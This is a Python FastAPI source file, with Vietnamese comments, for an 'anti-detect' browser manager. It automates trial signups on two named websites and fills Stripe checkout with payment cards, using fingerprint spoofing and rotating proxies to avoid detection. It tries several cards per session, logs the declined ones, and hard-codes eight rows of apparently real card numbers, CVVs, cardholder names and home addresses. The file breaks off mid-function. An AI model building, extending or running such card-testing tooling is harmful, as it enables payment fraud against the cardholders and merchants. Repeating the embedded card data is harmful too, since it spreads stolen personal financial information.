import json
import uuid
import threading
import time
import subprocess
import sys
import csv
import io
import random
import string
from pathlib import Path
from typing import Optional
from collections import deque

from fastapi import FastAPI, HTTPException, UploadFile, File
from fastapi.staticfiles import StaticFiles
from fastapi.responses import FileResponse, PlainTextResponse
from pydantic import BaseModel

# ─── Storage ───────────────────────────────────────────────────────────────────
DATA_FILE     = Path("data.json")
TASKS_FILE    = Path("tasks.json")
DECLINED_FILE = Path("declined_results.json")

def load_declined():
    if DECLINED_FILE.exists():
        try:
            return json.loads(DECLINED_FILE.read_text())
        except Exception:
            pass
    return {"records": []}

def save_declined_record(email: str, card: str, reason: str, cardholder: str = "",
                         password: str = "", exp_month: str = "", exp_year: str = "",
                         cvv: str = "", address: str = "", city: str = "",
                         state: str = "", zip_code: str = ""):
    """Thêm 1 record declined vào declined_results.json (thread-safe với GIL)."""
    d = load_declined()
    d["records"].append({
        "timestamp":  time.strftime("%Y-%m-%d %H:%M:%S"),
        "email":      email,
        "password":   password,
        "card":       card,
        "exp_month":  exp_month,
        "exp_year":   exp_year,
        "cvv":        cvv,
        "cardholder": cardholder,
        "address":    address,
        "city":       city,
        "state":      state,
        "zip":        zip_code,
        "reason":     reason,
    })
    DECLINED_FILE.write_text(json.dumps(d, indent=2))

def load_data():
    if DATA_FILE.exists():
        d = json.loads(DATA_FILE.read_text())
    else:
        d = {"profiles": {}}
    # Migration: backfill seed + timezone cho profile cũ thiếu
    changed = False
    for pid, p in d.get("profiles", {}).items():
        if p.get("seed") is None:
            p["seed"] = random.randint(1, 999999)
            changed = True
        if not p.get("timezone"):
            p["timezone"] = "America/New_York"
            changed = True
    if changed:
        DATA_FILE.write_text(json.dumps(d, indent=2))
    return d

def save_data(data):
    DATA_FILE.write_text(json.dumps(data, indent=2))

def load_tasks():
    if TASKS_FILE.exists():
        return json.loads(TASKS_FILE.read_text())
    return {"tasks": {}}

def save_tasks(t):
    TASKS_FILE.write_text(json.dumps(t, indent=2))

# ─── Proxy pool storage (thay thế Webshare) ───────────────────────────────────
PROXY_FILE = Path("proxies.json")

def load_proxies() -> dict:
    if PROXY_FILE.exists():
        return json.loads(PROXY_FILE.read_text())
    return {"proxies": []}

_proxy_file_lock = threading.Lock()

def save_proxies(d: dict):
    with _proxy_file_lock:
        PROXY_FILE.write_text(json.dumps(d, indent=2))

def update_proxy_fields(proxy_id: str, fields: dict):
    """Cập nhật 1 proxy an toàn (read-modify-write trong lock) → tránh race khi check-all."""
    with _proxy_file_lock:
        d = json.loads(PROXY_FILE.read_text()) if PROXY_FILE.exists() else {"proxies": []}
        for p in d.get("proxies", []):
            if p.get("id") == proxy_id:
                p.update(fields)
                break
        PROXY_FILE.write_text(json.dumps(d, indent=2))

# round-robin index cho automation
_proxy_rr_index = 0
_proxy_rr_lock  = threading.Lock()

def pick_next_proxy():
    """Lấy proxy tiếp theo theo round-robin từ pool nội bộ."""
    global _proxy_rr_index
    pool = load_proxies()
    proxies = [p for p in pool.get("proxies", []) if p.get("alive", True)]
    if not proxies:
        return None
    with _proxy_rr_lock:
        idx = _proxy_rr_index % len(proxies)
        _proxy_rr_index = idx + 1
    px = proxies[idx]
    # tăng used_count
    pool2 = load_proxies()
    for p in pool2["proxies"]:
        if p["id"] == px["id"]:
            p["used_count"] = p.get("used_count", 0) + 1
            break
    save_proxies(pool2)
    # trả về format tương thích với script runner
    return {
        "server":   f"socks5://{px['host']}:{px['port']}",
        "username": "",
        "password": "",
        "address":  px["host"],
        "port":     px["port"],
        "country":  "",
        "id":       px["id"],
    }

# ─── Active sessions ───────────────────────────────────────────────────────────
active_sessions: dict[str, dict] = {}
# task_id -> {status, logs, results, alive}
running_tasks: dict[str, dict] = {}

def push_log(pid: str, msg: str):
    if pid in active_sessions:
        active_sessions[pid]["logs"].append(f"{time.strftime('%H:%M:%S')} {msg}")

def push_task_log(tid: str, msg: str):
    if tid in running_tasks:
        running_tasks[tid]["logs"].append(f"{time.strftime('%H:%M:%S')} {msg}")

# ─── Auto-install check ────────────────────────────────────────────────────────
def ensure_invisible_playwright():
    try:
        from invisible_playwright import InvisiblePlaywright  # noqa
        result = subprocess.run(
            [sys.executable, "-m", "invisible_playwright", "path"],
            capture_output=True, text=True
        )
        binary_path = result.stdout.strip()
        if binary_path and Path(binary_path).exists():
            return True, binary_path
        return False, None
    except Exception:
        return False, None

# ─── Models ───────────────────────────────────────────────────────────────────
class Profile(BaseModel):
    name: str
    proxy_server: Optional[str] = None
    proxy_username: Optional[str] = None
    proxy_password: Optional[str] = None
    seed: Optional[int] = None
    timezone: Optional[str] = None

class UpdateProfile(BaseModel):
    name: Optional[str] = None
    proxy_server: Optional[str] = None
    proxy_username: Optional[str] = None
    proxy_password: Optional[str] = None
    seed: Optional[int] = None
    timezone: Optional[str] = None
    proxy_usage_limit: Optional[int] = None   # số lần dùng ghi chú (0 = không giới hạn)
    proxy_usage_count: Optional[int] = None   # đếm đã dùng bao nhiêu lần

class RunTaskRequest(BaseModel):
    script_id: str
    profile_id: Optional[str] = None   # None = dùng fingerprint ngẫu nhiên
    data_rows: list[dict]              # [{email, password}, ...]

# ─── App ───────────────────────────────────────────────────────────────────────
app = FastAPI(title="Anti-Detect Browser Manager")

# ══════════════════════════════════════════════════════════════════════════════
# PROFILE CRUD
# ══════════════════════════════════════════════════════════════════════════════
@app.get("/api/profiles")
def list_profiles():
    data = load_data()
    profiles = []
    for pid, p in data["profiles"].items():
        sess = active_sessions.get(pid)
        status = sess["status"] if sess else "stopped"
        seed   = sess["seed"]   if sess else None
        profiles.append({**p, "id": pid, "status": status, "live_seed": seed})
    return profiles

@app.post("/api/profiles", status_code=201)
def create_profile(body: Profile):
    data = load_data()
    pid = str(uuid.uuid4())[:8]
    # Auto-assign seed nếu không truyền
    seed = body.seed if body.seed is not None else random.randint(1, 999999)
    # Auto-assign timezone từ proxy country nếu có, không thì mặc định America/New_York
    tz = body.timezone
    if not tz and body.proxy_server:
        tz = "America/New_York"  # default khi có proxy nhưng không biết country
    if not tz:
        tz = "America/New_York"
    data["profiles"][pid] = {
        "name": body.name,
        "proxy_server": body.proxy_server,
        "proxy_username": body.proxy_username,
        "proxy_password": body.proxy_password,
        "seed": seed,
        "timezone": tz,
        "created_at": time.strftime("%Y-%m-%d %H:%M:%S"),
    }
    save_data(data)
    return {**data["profiles"][pid], "id": pid, "status": "stopped", "live_seed": None}

@app.patch("/api/profiles/{pid}")
def update_profile(pid: str, body: UpdateProfile):
    data = load_data()
    if pid not in data["profiles"]:
        raise HTTPException(404, "Profile not found")
    p = data["profiles"][pid]
    for field, val in body.model_dump(exclude_none=True).items():
        p[field] = val
    save_data(data)
    sess   = active_sessions.get(pid)
    status = sess["status"] if sess else "stopped"
    return {**p, "id": pid, "status": status, "live_seed": sess["seed"] if sess else None}

@app.delete("/api/profiles/{pid}")
def delete_profile(pid: str):
    data = load_data()
    if pid not in data["profiles"]:
        raise HTTPException(404, "Profile not found")
    if pid in active_sessions:
        _stop_browser(pid)
    del data["profiles"][pid]
    save_data(data)
    return {"ok": True}

@app.get("/api/profiles/{pid}/context")
def get_profile_context(pid: str):
    data = load_data()
    if pid not in data["profiles"]:
        raise HTTPException(404, "Profile not found")
    p = data["profiles"][pid]
    kwargs: dict = {}
    if p.get("proxy_server"):
        proxy = {"server": p["proxy_server"]}
        if p.get("proxy_username"): proxy["username"] = p["proxy_username"]
        if p.get("proxy_password"): proxy["password"] = p["proxy_password"]
        kwargs["proxy"] = proxy
    if p.get("seed") is not None:
        kwargs["seed"] = int(p["seed"])
    if p.get("timezone"):
        kwargs["timezone"] = p["timezone"]
    return {"id": pid, "name": p["name"], "kwargs": kwargs}

# ══════════════════════════════════════════════════════════════════════════════
# BROWSER LAUNCH / STOP
# ══════════════════════════════════════════════════════════════════════════════
def _launch_browser(pid: str, profile: dict):
    try:
        push_log(pid, "Kiểm tra tài nguyên invisible_playwright...")
        binary_ok, bpath = ensure_invisible_playwright()
        if not binary_ok:
            push_log(pid, "Binary Firefox chưa có — đang tải xuống (1-3 phút)...")
            active_sessions[pid]["status"] = "downloading"
            result = subprocess.run(
                [sys.executable, "-m", "invisible_playwright", "fetch"],
                capture_output=True, text=True, timeout=300
            )
            if result.returncode != 0:
                raise RuntimeError(f"Fetch failed: {result.stderr}")
            push_log(pid, "Tải binary xong!")
        else:
            push_log(pid, f"Binary đã có: {bpath}")

        from invisible_playwright import InvisiblePlaywright
        proxy = None
        if profile.get("proxy_server"):
            proxy = {"server": profile["proxy_server"]}
            if profile.get("proxy_username"): proxy["username"] = profile["proxy_username"]
            if profile.get("proxy_password"): proxy["password"] = profile["proxy_password"]
            push_log(pid, f"Proxy: {profile['proxy_server']}")

        kwargs: dict = {}
        if proxy: kwargs["proxy"] = proxy
        if profile.get("seed") is not None: kwargs["seed"] = int(profile["seed"])
        if profile.get("timezone"):
            kwargs["timezone"] = profile["timezone"]
            push_log(pid, f"Timezone: {profile['timezone']}")

        push_log(pid, "Đang khởi động trình duyệt...")
        active_sessions[pid]["status"] = "starting"
        ip_client = InvisiblePlaywright(**kwargs)

        with ip_client as browser:
            active_sessions[pid]["status"] = "running"
            active_sessions[pid]["seed"]   = ip_client.seed
            push_log(pid, f"Browser đã chạy! Seed: {ip_client.seed}")
            page = browser.new_page()
            page.goto("about:blank")
            while active_sessions.get(pid, {}).get("alive", False):
                time.sleep(1)
            push_log(pid, "Đang đóng trình duyệt...")
            try: browser.close()
            except: pass
    except Exception as e:
        if pid in active_sessions:
            active_sessions[pid]["status"] = f"error: {e}"
            push_log(pid, f"Lỗi: {e}")

def _stop_browser(pid: str):
    if pid in active_sessions:
        active_sessions[pid]["alive"] = False
        time.sleep(2)
        active_sessions.pop(pid, None)

@app.post("/api/profiles/{pid}/launch")
def launch_browser(pid: str):
    data = load_data()
    if pid not in data["profiles"]: raise HTTPException(404, "Profile not found")
    if pid in active_sessions:      raise HTTPException(400, "Already running")
    profile = data["profiles"][pid]
    active_sessions[pid] = {"alive": True, "status": "starting", "seed": None, "logs": deque(maxlen=200)}
    t = threading.Thread(target=_launch_browser, args=(pid, profile), daemon=True)
    t.start()
    active_sessions[pid]["thread"] = t
    return {"ok": True, "status": "starting"}

@app.post("/api/profiles/{pid}/stop")
def stop_browser(pid: str):
    if pid not in active_sessions: raise HTTPException(400, "Not running")
    _stop_browser(pid)
    return {"ok": True}

@app.get("/api/profiles/{pid}/status")
def get_status(pid: str):
    if pid not in active_sessions:
        return {"status": "stopped", "seed": None, "logs": []}
    sess = active_sessions[pid]
    return {"status": sess.get("status", "unknown"), "seed": sess.get("seed"), "logs": list(sess.get("logs", []))}

# ══════════════════════════════════════════════════════════════════════════════
# BINARY
# ══════════════════════════════════════════════════════════════════════════════
@app.get("/api/binary/check")
def check_binary():
    ok, path = ensure_invisible_playwright()
    return {"installed": ok, "path": path}

@app.post("/api/binary/fetch")
def fetch_binary():
    def do_fetch():
        result = subprocess.run(
            [sys.executable, "-m", "invisible_playwright", "fetch"],
            capture_output=True, text=True, timeout=300
        )
        app.state.fetch_done = True
        app.state.fetch_ok   = result.returncode == 0
        app.state.fetch_log  = result.stdout + result.stderr

    app.state.fetch_done = False
    app.state.fetch_ok   = False
    app.state.fetch_log  = ""
    threading.Thread(target=do_fetch, daemon=True).start()
    return {"ok": True}

@app.get("/api/binary/status")
def binary_status():
    done      = getattr(app.state, "fetch_done", True)
    ok        = getattr(app.state, "fetch_ok",   True)
    log       = getattr(app.state, "fetch_log",  "")
    installed, path = ensure_invisible_playwright()
    return {"done": done, "ok": ok, "log": log, "installed": installed, "path": path}

# ══════════════════════════════════════════════════════════════════════════════
# SCRIPTS REGISTRY
# ══════════════════════════════════════════════════════════════════════════════
SCRIPTS = [
    {
        "id": "dropaudit_signup",
        "name": "DropAudit — Đăng ký + Trial",
        "description": "Signup → Create Account → Start My Trial → Stripe: điền Card info → bấm Pay and start trial (dừng tại đây)",
        "fields": ["email", "password", "card_number", "exp_month", "exp_year", "cvv", "cardholder_name", "address", "city", "state", "zip"],
        "url": "https://dropaudit.com/signup",
    },
    {
        "id": "simen_trial",
        "name": "Simen.ai — $1 Trial Signup",
        "description": "Go simen.ai → Try for $1 → Sign up email → Create account → Lite plan → Fill card → Pay",
        "fields": ["email", "password", "card_number", "exp_month", "exp_year", "cvv", "cardholder_name", "zip"],
        "url": "https://simen.ai",
    },
]

@app.get("/api/scripts")
def list_scripts():
    return SCRIPTS

# ══════════════════════════════════════════════════════════════════════════════
# DATA — gen / upload / parse CSV
# ══════════════════════════════════════════════════════════════════════════════
def _random_email():
    chars  = string.ascii_lowercase + string.digits
    prefix = "".join(random.choices(chars, k=random.randint(6, 10)))
    domain = random.choice(["gmail.com", "yahoo.com", "outlook.com", "hotmail.com", "proton.me"])
    return f"{prefix}@{domain}"

def _random_password(length=12):
    chars = string.ascii_letters + string.digits + "!@#$%"
    return "".join(random.choices(chars, k=length))

@app.get("/api/data/sample.csv")
def download_sample_csv():
    """Tải file CSV mẫu gồm các cột card info."""
    fields = ["email","password","card_number","exp_month","exp_year","cvv","cardholder_name","address","city","state","zip"]
    sample = get_sample_card_data()
    buf = io.StringIO()
    writer = csv.DictWriter(buf, fieldnames=fields)
    writer.writeheader()
    writer.writerows(sample)
    return PlainTextResponse(buf.getvalue(), media_type="text/csv",
                             headers={"Content-Disposition": 'attachment; filename="card_data_sample.csv"'})

@app.post("/api/data/parse-csv")
async def parse_csv(file: UploadFile = File(...)):
    """Upload CSV → trả về rows dạng JSON."""
    content = await file.read()
    text    = content.decode("utf-8-sig")
    reader  = csv.DictReader(io.StringIO(text))
    rows = []
    for row in reader:
        norm = {k.strip().lower().replace(" ","_"): v.strip() for k, v in row.items()}
        email    = norm.get("email") or norm.get("mail") or norm.get("e-mail") or ""
        password = norm.get("password") or norm.get("pass") or norm.get("pw") or ""
        if email:
            rows.append({
                "email":            email,
                "password":         password,
                "card_number":      norm.get("card_number") or norm.get("card") or norm.get("cc") or "",
                "exp_month":        norm.get("exp_month") or norm.get("month") or norm.get("mm") or "",
                "exp_year":         norm.get("exp_year") or norm.get("year") or norm.get("yy") or norm.get("yyyy") or "",
                "cvv":              norm.get("cvv") or norm.get("cvc") or norm.get("csc") or "",
                "cardholder_name":  norm.get("cardholder_name") or norm.get("name") or norm.get("holder") or "",
                "address":          norm.get("address") or norm.get("addr") or "",
                "city":             norm.get("city") or "",
                "state":            norm.get("state") or "",
                "zip":              norm.get("zip") or norm.get("zipcode") or norm.get("postal") or "",
            })
    return {"rows": rows, "count": len(rows)}


@app.get("/api/data/sample")
def get_sample_card_data():
    """Trả về 8 hàng card data mẫu (hard-coded từ user)."""
    return [
        {"email":"","password":"","card_number":"4266841809730904","exp_month":"03","exp_year":"29","cvv":"949","cardholder_name":"Ashley Tuttle","address":"77 Glenbrook Rd Apt207","city":"Stamford","state":"CT","zip":"06902"},
        {"email":"","password":"","card_number":"4269630006435996","exp_month":"01","exp_year":"30","cvv":"903","cardholder_name":"Marissa Jenkins","address":"1260 Riverside Road","city":"Sugar Hill","state":"GA","zip":"30518"},
        {"email":"","password":"","card_number":"4270825047841353","exp_month":"06","exp_year":"27","cvv":"676","cardholder_name":"Gregory Ludwig","address":"3029 E Pine Ave","city":"Fresno","state":"CA","zip":"93703"},
        {"email":"","password":"","card_number":"4305729958236059","exp_month":"06","exp_year":"29","cvv":"275","cardholder_name":"Hannu Laakso","address":"Laakso","city":"Somers","state":"NY","zip":"10589"},
        {"email":"","password":"","card_number":"4315032050941850","exp_month":"02","exp_year":"27","cvv":"667","cardholder_name":"Ana Alegre","address":"2551 Aragon Blv apt 308","city":"Sunrise","state":"FL","zip":"33322"},
        {"email":"","password":"","card_number":"4327390115694161","exp_month":"02","exp_year":"27","cvv":"971","cardholder_name":"Kayden T Bunn","address":"3101 Aileen Dr. Apt. H","city":"Raleigh","state":"NC","zip":"27606"},
        {"email":"","password":"","card_number":"4334190001454204","exp_month":"01","exp_year":"29","cvv":"572","cardholder_name":"Shanice collier","address":"34 Thornton Ave","city":"Youngstown","state":"OH","zip":"44505"},
        {"email":"","password":"","card_number":"4270825047841353","exp_month":"02","exp_year":"29","cvv":"501","cardholder_name":"Joseph M Shannonhouse","address":"461 Edenhall Dr","city":"Columbia","state":"SC","zip":"29229"},
    ]

# ══════════════════════════════════════════════════════════════════════════════
# AUTOMATION RUNNER
# ══════════════════════════════════════════════════════════════════════════════
def _fill_stripe_frame_field(page, frame_name_hint: str, text: str, log_fn):
    """
    Điền text vào 1 input bên trong Stripe iframe.
    Stripe có nhiều iframe con: số thẻ / MM-YY / CVC — mỗi cái là 1 frame riêng.
    """
    import re
    try:
        # Stripe embeds multiple iframes; tìm đúng frame chứa hint
        for frame in page.frames:
            url = frame.url or ""
            name = frame.name or ""
            # Stripe card iframes có URL dạng: https://js.stripe.com/v3/elements/...
            if "stripe" not in url and "stripe" not in name:
                continue
            # Thử tìm input bên trong
            try:
                inp = frame.query_selector("input")
                if inp:
                    inp.click()
                    inp.fill("")
                    inp.type(text, delay=50)
                    log_fn(f"    → điền '{frame_name_hint}': {text[:4]}***")
                    return True
            except Exception:
                continue
    except Exception as e:
        log_fn(f"    ⚠ fill_stripe_frame_field lỗi: {e}")
    return False


def _run_dropaudit_signup(tid: str, profile: dict, rows: list[dict]):
    """Chạy script DropAudit signup + Stripe card fill cho từng hàng dữ liệu."""
    import os
    import time as _t_top
    import random as _rnd
    if not os.environ.get("DISPLAY"):
        os.environ["DISPLAY"] = ":99"

    try:
        from invisible_playwright import InvisiblePlaywright

        kwargs: dict = {}
        # Lấy proxy từ profile, nếu không có thì pick từ Webshare round-robin
        _proxy_src = profile.get("proxy_server")
        _proxy_user = profile.get("proxy_username")
        _proxy_pass = profile.get("proxy_password")
        _ws_px_id   = ""  # id proxy đang dùng (để flag captcha)
        if not _proxy_src:
            _ws_px = pick_next_proxy()
            if _ws_px:
                _proxy_src  = _ws_px["server"]
                _proxy_user = _ws_px.get("username", "")
                _proxy_pass = _ws_px.get("password", "")
                _ws_px_id   = str(_ws_px.get("id", ""))
                log(f"[Auto] Dùng proxy pool: {_ws_px['host']}:{_ws_px['port']}")
        if _proxy_src:
            proxy = {"server": _proxy_src}
            if _proxy_user: proxy["username"] = _proxy_user
            if _proxy_pass: proxy["password"] = _proxy_pass
            kwargs["proxy"] = proxy
        if profile.get("seed") is not None:
            kwargs["seed"] = int(profile["seed"])
        if profile.get("timezone"):
            kwargs["timezone"] = profile["timezone"]

        total = len(rows)
        push_task_log(tid, f"Bắt đầu — {total} hàng cần xử lý")
        running_tasks[tid]["total"] = total
        running_tasks[tid]["done"]  = 0

        for idx, row in enumerate(rows):
            if not running_tasks.get(tid, {}).get("alive", False):
                push_task_log(tid, "⛔ Tác vụ bị dừng.")
                break

            # Email/password tự gen ngẫu nhiên nếu không có sẵn
            email    = row.get("email", "").strip()
            password = row.get("password", "").strip()
            if not email:
                email = _random_email()
            if not password:
                password = _random_password(12)

            card_number     = row.get("card_number", "").strip().replace(" ", "")
            exp_month       = row.get("exp_month", "").strip().zfill(2)
            exp_year        = row.get("exp_year", "").strip()
            cvv             = row.get("cvv", "").strip()
            cardholder_name = row.get("cardholder_name", "").strip()
            address         = row.get("address", "").strip()
            city            = row.get("city", "").strip()
            state           = row.get("state", "").strip()
            zip_code        = row.get("zip", "").strip()

            # Stripe cần MM/YY (2 chữ số năm)
            exp_year_2 = exp_year[-2:] if len(exp_year) >= 2 else exp_year
            exp_mmyy   = f"{exp_month}{exp_year_2}"  # vd "0329"

            def log(msg): push_task_log(tid, msg)

            log(f"[{idx+1}/{total}] ▶ {email} | card: {card_number[:4] if card_number else '—'}****")

            result_row = {**row, "email": email, "password": password, "status": "pending"}

            try:
                ip = InvisiblePlaywright(**kwargs)
                with ip as browser:
                    page = browser.new_page()
                    _keep_alive = threading.Event()  # dùng để block thread khi cần giữ browser
                    _stop_flag = [False]
                    running_tasks[tid]["_keep_alive"] = _keep_alive  # expose để stop_task có thể set()

                    # ── STEP 1: Đăng ký ────────────────────────────────────────
                    if True:  # luôn chạy signup
                        log(f"[{idx+1}] → dropaudit.com/signup")
                        # Proxy yếu: tăng timeout goto lên 90s, wait networkidle
                        try:
                            page.goto("https://dropaudit.com/signup", wait_until="domcontentloaded", timeout=90000)
                        except Exception as _ge:
                            log(f"[{idx+1}] ⚠ goto timeout/err: {_ge} — thử tiếp")

                        # Chờ field email xuất hiện tối đa 45s
                        log(f"[{idx+1}] ⏳ Chờ form đăng ký load (45s)...")
                        page.wait_for_selector('input[type="email"]', timeout=45000)
                        page.wait_for_timeout(1500)  # đợi JS hydrate xong

                        # Điền email
                        el = page.query_selector('input[type="email"]')
                        if el:
                            el.click()
                            page.wait_for_timeout(300)
                            el.fill("")
                            el.type(email, delay=80)
                            log(f"[{idx+1}] ✓ Email đã điền")
                        else:
                            log(f"[{idx+1}] ⚠ Không tìm thấy field email")

                        page.wait_for_timeout(500)

                        # Điền password
                        el = page.query_selector('input[type="password"]')
                        if el:
                            el.click()
                            page.wait_for_timeout(300)
                            el.fill("")
                            el.type(password, delay=80)
                            log(f"[{idx+1}] ✓ Password đã điền")
                        else:
                            log(f"[{idx+1}] ⚠ Không tìm thấy field password")

                        page.wait_for_timeout(800)

                        # Click Create Account — chờ selector xuất hiện trước
                        log(f"[{idx+1}] ⏳ Chờ nút Create Account...")
                        page.wait_for_selector('button:has-text("Create Account")', timeout=20000)
                        page.wait_for_timeout(500)

                        # Bắt response signup để phát hiện lỗi 422 (email/password bị từ chối)
                        _signup_status = [None]
                        def _on_signup_resp(r):
                            try:
                                if "auth/v1/signup" in r.url:
                                    _signup_status[0] = r.status
                            except Exception:
                                pass
                        page.on("response", _on_signup_resp)

                        page.click('button:has-text("Create Account")')
                        log(f"[{idx+1}] ✓ Clicked Create Account")
                        page.wait_for_timeout(3500)  # chờ API trả về

                        # Kiểm tra kết quả signup
                        if _signup_status[0] is not None and _signup_status[0] >= 400:
                            log(f"[{idx+1}] ✗ Đăng ký BỊ TỪ CHỐI (HTTP {_signup_status[0]}). "
                                f"Email có thể không hợp lệ/đã tồn tại HOẶC password quá yếu. "
                                f"→ Dùng email thật (vd outlook/email mua) + password mạnh (chữ hoa+thường+số+ký tự đặc biệt, ≥10 ký tự).")
                            result_row["status"] = f"signup_failed_{_signup_status[0]}"
                            try: page.remove_listener("response", _on_signup_resp)
                            except Exception: pass
                            raise RuntimeError(f"Signup HTTP {_signup_status[0]}")
                        try: page.remove_listener("response", _on_signup_resp)
                        except Exception: pass

                        # Đợi React re-render xong — nút Start My Trial xuất hiện tối đa 45s
                        log(f"[{idx+1}] ⏳ Đợi Start My Trial button (45s)...")
                        page.wait_for_selector('button:has-text("Start My Trial")', timeout=45000)
                        page.wait_for_timeout(1500)  # đợi animation/hydrate
                        # Dùng JS click để tránh visibility/scroll issues
                        page.evaluate("""
                            () => {
                                const btns = [...document.querySelectorAll('button')];
                                const btn = btns.find(b => b.textContent.includes('Start My Trial'));
                                if (btn) btn.click();
                            }
                        """)
                        log(f"[{idx+1}] ✓ Clicked Start My Trial (JS)")

                        # Đợi redirect sang Stripe — tối đa 15s
                        page.wait_for_timeout(5000)
                        log(f"[{idx+1}] URL sau trial click: {page.url[:80]}")

                    # ── STEP 2: Stripe Checkout ─────────────────────────────────
                    if card_number:
                        _pay_success = False
                        # 1 phiên = 1 mail/pass + tối đa 3 thẻ
                        # _current_card_row: thẻ đang dùng (chỉ lấy card info, mail/pass giữ nguyên)
                        _current_card_row = row
                        _cards_tried = 0  # đếm số thẻ đã thử trong phiên này
                        for _pay_retry in range(3):  # tối đa 3 thẻ/phiên
                          # LUÔN reset stale locator đầu mỗi vòng — tránh dùng locator từ page cũ
                          _card_loc = None
                          _card_ctx = None
                          # Đọc thông tin thẻ từ _current_card_row
                          card_number     = _current_card_row.get("card_number", "").strip().replace(" ", "")
                          exp_month       = _current_card_row.get("exp_month", "").strip().zfill(2)
                          exp_year        = _current_card_row.get("exp_year", "").strip()
                          cvv             = _current_card_row.get("cvv", "").strip()
                          cardholder_name = _current_card_row.get("cardholder_name", "").strip()
                          zip_code        = _current_card_row.get("zip", "").strip()
                          address         = _current_card_row.get("address", "").strip()
                          exp_year_2      = exp_year[-2:] if len(exp_year) >= 2 else exp_year
                          exp_mmyy        = f"{exp_month}{exp_year_2}"
                          if not card_number:
                              log(f"[{idx+1}] ⚠ Không còn thẻ để thử — dừng")
                              break
                          log(f"[{idx+1}] ⏳ Đợi Stripe Checkout load thẻ {_pay_retry+1}/3 (tối đa 60s)...")
                          # Đợi redirect tới stripe hoặc trang có card input
                          stripe_loaded = False
                          for _w in range(60):
                              cur_url = page.url
                              if "stripe.com" in cur_url or "checkout" in cur_url:
                                  stripe_loaded = True
                                  log(f"[{idx+1}] ✓ Stripe URL sau {_w}s: {cur_url[:80]}")
                                  break
                              # Hoặc đợi input card xuất hiện trực tiếp
                              try:
                                  found = page.query_selector(
                                      'input[name="cardnumber"], input[autocomplete*="cc-number"], '
                                      '[data-elements-stable-field-name="cardNumber"]'
                                  )
                                  if found:
                                      stripe_loaded = True
                                      log(f"[{idx+1}] ✓ Card input thấy trực tiếp sau {_w}s")
                                      break
                              except Exception:
                                  pass
                              page.wait_for_timeout(1000)

                          if not stripe_loaded:
                              log(f"[{idx+1}] ⚠ Stripe chưa load sau 60s, URL: {page.url[:80]}")

                          log(f"[{idx+1}] URL Stripe: {page.url[:80]}")
                          # ── CHỜ Ô CARD THẬT SỰ SẴN SÀNG (mục 1 - fix kỹ) ───────────
                          # QUAN TRỌNG: KHÔNG dùng iframe[src*="stripe.com"] để detect vì
                          # iframe ẩn của Stripe luôn tồn tại ngay khi trang load → báo
                          # "thấy form" trong khi ô nhập card CHƯA render → điền hụt.
                          #
                          # Trên checkout.stripe.com (hosted), ô card là INPUT TRỰC TIẾP
                          # trên trang. Phải chờ tới khi input đó:
                          #   1) tồn tại trong DOM
                          #   2) visible (bounding box > 0)
                          #   3) enabled (không disabled / readonly)
                          # rồi mới coi là sẵn sàng. Chờ tối đa 45s (proxy chậm).
                          _card_sel_all = (
                              'input[name="cardnumber"], input[autocomplete="cc-number"], '
                              'input[autocomplete*="cc-number"], '
                              'input[placeholder*="1234"], input[placeholder*="Card number" i], '
                              '[data-elements-stable-field-name="cardNumber"] input, '
                              'input#cardNumber, input[id*="cardNumber" i], input[id*="card-number" i]'
                          )

                          def _find_card_input():
                              """Trả về (frame, locator) của ô card đang VISIBLE+ENABLED, hoặc (None,None)."""
                              # a) main page
                              try:
                                  _lc = page.locator(_card_sel_all).first
                                  if _lc.count() > 0 and _lc.is_visible() and _lc.is_enabled():
                                      return (page, _lc)
                              except Exception:
                                  pass
                              # b) bên trong các frame stripe (Stripe Elements embedded - same-origin reachable)
                              for _fr in page.frames:
                                  if "stripe.com" not in (_fr.url or ""):
                                      continue
                                  try:
                                      _lc = _fr.locator(_card_sel_all).first
                                      if _lc.count() > 0 and _lc.is_visible() and _lc.is_enabled():
                                          return (_fr, _lc)
                                  except Exception:
                                      pass
                              return (None, None)

                          # Đảm bảo mọi navigation đang pending xong trước khi detect card
                          try:
                              page.wait_for_load_state("load", timeout=20000)
                          except Exception:
                              pass
                          try:
                              page.wait_for_load_state("networkidle", timeout=10000)
                          except Exception:
                              pass

                          log(f"[{idx+1}] ⏳ Chờ ô nhập thẻ SẴN SÀNG (visible+enabled, tối đa 45s)...")
                          _card_ctx, _card_loc = (None, None)
                          _card_field_dl = _t_top.time() + 45.0
                          while _t_top.time() < _card_field_dl:
                              _card_ctx, _card_loc = _find_card_input()
                              if _card_loc is not None:
                                  log(f"[{idx+1}] ✓ Ô card đã render & sẵn sàng")
                                  break
                              page.wait_for_timeout(1000)

                          if _card_loc is None:
                              log(f"[{idx+1}] ⚠ Ô card CHƯA render sau 45s → reload thử lại")
                              continue  # sang vòng _pay_retry tiếp theo (reload)

                          # Chờ thêm cho JS Stripe hydrate (event listener gắn xong)
                          page.wait_for_timeout(2500)

                          # ── Helper điền vào Stripe iframe bằng MOUSE + KEYBOARD ─────
                          # Firefox chặn truy cập cross-origin iframe (frame.locator /
                          # query_selector KHÔNG dùng được với js.stripe.com). Cách đã
                          # confirm hoạt động: resize iframe cho visible → mouse.click
                          # vào đúng tọa độ → keyboard.press từng ký tự.
                          def _fill_card_via_mouse(value, field_name, x_ratio=0.12):
                              try:
                                  # Phóng to iframe card để Playwright coi là visible
                                  page.evaluate("""
                                      () => {
                                          const ifr = document.querySelector(
                                              'iframe[title*="card" i], iframe[title*="payment" i], '
                                              + 'iframe[title*="Secure" i], iframe[name*="privateStripeFrame"], '
                                              + 'iframe[src*="stripe.com"]'
                                          );
                                          if (ifr) {
                                              ifr.style.setProperty('height','120px','important');
                                              ifr.style.setProperty('min-height','100px','important');
                                          }
                                      }
                                  """)
                                  _t_top.sleep(0.3)
                                  _ifr_el = None
                                  for _sel_ifr in [
                                      'iframe[title*="card" i]', 'iframe[title*="payment" i]',
                                      'iframe[title*="Secure" i]', 'iframe[name*="privateStripeFrame"]',
                                      'iframe[src*="stripe.com"]',
                                  ]:
                                      try:
                                          _ifr_el = page.query_selector(_sel_ifr)
                                          if _ifr_el:
                                              break
                                      except Exception:
                                          pass
                                  if not _ifr_el:
                                      return False
                                  _bb = _ifr_el.bounding_box()
                                  if not _bb or _bb["width"] < 10:
                                      return False
                                  _cx = _bb["x"] + _bb["width"] * x_ratio
                                  _cy = _bb["y"] + _bb["height"] / 2
                                  page.mouse.move(_cx, _cy)
                                  _t_top.sleep(0.15)
                                  page.mouse.click(_cx, _cy)
                                  _t_top.sleep(0.4)
                                  # clear sạch trước
                                  for _ in range(20):
                                      page.keyboard.press("Backspace")
                                  _t_top.sleep(0.2)
                                  for _ch in value:
